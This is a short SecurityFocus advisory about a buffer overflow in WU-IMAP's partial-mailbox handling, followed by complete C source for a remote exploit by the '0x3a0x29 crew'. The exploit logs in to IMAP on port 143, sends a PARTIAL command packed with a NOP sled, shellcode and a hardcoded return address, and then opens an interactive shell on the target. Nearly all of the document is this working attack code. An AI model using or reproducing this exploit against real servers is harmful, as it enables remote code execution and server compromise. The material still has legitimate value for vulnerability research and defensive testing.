source: http://www.securityfocus.com/bid/4713/info
 
Wu-imapd is vulnerable to a buffer overflow condition. This has been reported to occur when a valid user requests partial mailbox attributes. Exploitation may result in the execution of arbitrary code as the server process. An attacker may also be able to crash the server, resulting in a denial of service condition.
 
This only affects versions of imapd with legacy RFC 1730 support, which is disabled by default in imapd 2001.313 and imap-2001.315.

/*
 * 0x3a0x29wuim.c - WU-IMAP 2000.287 (linux/i86) remote exploit
 *
 * dekadish
 *
 *  0x3a0x29 crew
 *
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define RETADDR 0x080eb395 /* My Debian 2.2 box */
#define MAILDIR "/var/spool/mail"

char shellcode[] =
 "\x55\x89\xe5\x55\x89\xe5\x83\xec\x28\xc6\x45\xd8\x2f\xc6\x45\xdc"
 "\x2f\xc6\x45\xd9\x5f\xc6\x45\xda\x5a\xc6\x45\xdb\x5f\xc6\x45\xdd"
 "\x5f\xc6\x45\xde\x5f\x83\x45\xd9\x03\x83\x45\xda\x0f\x83\x45\xdb"
 "\x0f\x83\x45\xdd\x14\x83\x45\xde\x09\x31\xc0\x89\x45\xdf\x89\x45"
 "\xf4\x8d\x45\xd8\x89\x45\xf0\x83\xec\x04\x8d\x45\xf0\x31\xd2\x89"
 "\xd3\x89\xc1\x8b\x45\xf0\x89\xc3\x31\xc0\x83\xc0\x0b\xcd\x80\x31"
 "\xc0\x40\xcd\x80";

int main(int argc, char *argv[])
{
	int s, i;
	fd_set fds;
	char tmp[2048], buf[1060];
	char *target, *login, *pass, *p;
	struct sockaddr_in sock;
	unsigned long retaddr;

	fprintf(stderr, "%s\n", "[The #smile Crew]");
	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s <Target ip> <Login> <Password>\n", argv[0]);
		exit(-1);
	}

	retaddr = RETADDR;
	target  = argv[1];
	login   = argv[2];
	pass    = argv[3];

	s = socket(AF_INET, SOCK_STREAM, 0);
	sock.sin_port = htons(143);
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(target);

	printf("\nConnecting to %s:143...", target);
	fflush(stdout);
	if ((connect(s, (struct sockaddr *)&sock, sizeof(sock))) < 0)
	{
		printf("failed\n");
		exit(-1);
	}
	else
		recv(s, tmp, sizeof(tmp), 0);

	printf("done\nLogging in...");
	fflush(stdout);
	snprintf(tmp, sizeof(tmp), "A0666 LOGIN %s %s\n", login, pass);
	send(s, tmp, strlen(tmp), 0);
	recv(s, tmp, sizeof(tmp), 0);

	if (!strstr(tmp, "completed"))
	{
		printf("failed\n");
		exit(-1);
	}

	printf("done\nExploiting...");
	fflush(stdout);

	dprintf(s, "A0666 SELECT %s/%s\n", MAILDIR, login);

	memset(buf, 0x0, sizeof(buf));
	p = buf;
	memset(p, 0x90, 928);
	p += 928;
	memcpy(p, shellcode, 100);
	p += 100;

	for (i=0; i<6; i++)
	{
		memcpy(p, &retaddr, 0x4);
		p += 0x4;
	}

	snprintf(tmp, sizeof(tmp), "A0666 PARTIAL 1 BODY[%s] 1 1\n", buf);
	send(s, tmp, strlen(tmp), 0);
	dprintf(s, "A0666 LOGOUT\n");
	sleep(5);
	printf("done\n\n");

	read(s, tmp, sizeof(tmp));
	dprintf(s, "uname -a;id;\n");
	memset(tmp, 0x0, sizeof(tmp));

	while (1)
	{
		FD_ZERO(&fds);
		FD_SET(s, &fds);
		FD_SET(1, &fds);

		select((s+1), &fds, 0, 0, 0);

		if (FD_ISSET(s, &fds))
		{
			if ((i = recv(s, tmp, sizeof(tmp), 0)) < 1)
			{
				fprintf(stderr, "Connection closed\n");
				exit(0);
			}
			write(0, tmp, i);
		}
		if (FD_ISSET(1, &fds))
		{
			i = read(1, tmp, sizeof(tmp));
			send(s, tmp, i, 0);
		}
	}

	return;
}